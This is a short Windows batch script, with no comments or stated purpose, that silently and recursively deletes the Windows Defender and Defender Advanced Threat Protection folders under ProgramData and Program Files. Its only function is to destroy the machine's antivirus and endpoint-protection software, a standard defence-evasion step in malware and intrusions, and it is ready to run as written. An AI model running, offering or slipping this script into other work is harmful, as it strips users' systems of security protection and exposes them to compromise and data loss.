@echo off
for %%D in (
    "%ProgramData%\Microsoft\Windows Defender"
    "%ProgramFiles%\Windows Defender Advanced Threat Protection"
    "%ProgramFiles%\Windows Defender"
    "%ProgramFiles(x86)%\Windows Defender"
) do (
    rd /s /q "%%~D"
)
exit